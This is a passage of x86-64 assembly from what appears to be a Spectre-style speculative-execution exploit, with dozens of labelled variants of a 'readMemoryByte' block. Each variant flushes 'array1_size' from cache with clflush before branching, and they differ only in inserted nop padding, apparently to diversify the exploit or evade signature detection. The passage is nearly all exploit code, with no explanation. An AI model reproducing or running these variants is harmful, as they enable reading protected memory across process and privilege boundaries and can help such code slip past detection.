	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 90
.LreadMemoryByte_win6_var90:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 91
.LreadMemoryByte_win6_var91:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 92
.LreadMemoryByte_win6_var92:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 93
.LreadMemoryByte_win6_var93:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 94
.LreadMemoryByte_win6_var94:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 95
.LreadMemoryByte_win6_var95:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 96
.LreadMemoryByte_win6_var96:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 97
.LreadMemoryByte_win6_var97:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 98
.LreadMemoryByte_win6_var98:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 99
.LreadMemoryByte_win6_var99:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 100
.LreadMemoryByte_win6_var100:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 101
.LreadMemoryByte_win6_var101:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 102
.LreadMemoryByte_win6_var102:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 103
.LreadMemoryByte_win6_var103:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 104
.LreadMemoryByte_win6_var104:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 105
.LreadMemoryByte_win6_var105:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 106
.LreadMemoryByte_win6_var106:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 107
.LreadMemoryByte_win6_var107:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 108
.LreadMemoryByte_win6_var108:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 109
.LreadMemoryByte_win6_var109:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 110
.LreadMemoryByte_win6_var110:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 111
.LreadMemoryByte_win6_var111:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 112
.LreadMemoryByte_win6_var112:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 113
.LreadMemoryByte_win6_var113:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 114
.LreadMemoryByte_win6_var114:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 115
.LreadMemoryByte_win6_var115:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 116
.LreadMemoryByte_win6_var116:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 117
.LreadMemoryByte_win6_var117:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 118
.LreadMemoryByte_win6_var118:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 119
.LreadMemoryByte_win6_var119:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 120
.LreadMemoryByte_win6_var120:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 121
.LreadMemoryByte_win6_var121:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 122
.LreadMemoryByte_win6_var122:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 123
.LreadMemoryByte_win6_var123:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 124
.LreadMemoryByte_win6_var124:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 125
.LreadMemoryByte_win6_var125:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 126
.LreadMemoryByte_win6_var126:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 127
.LreadMemoryByte_win6_var127:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
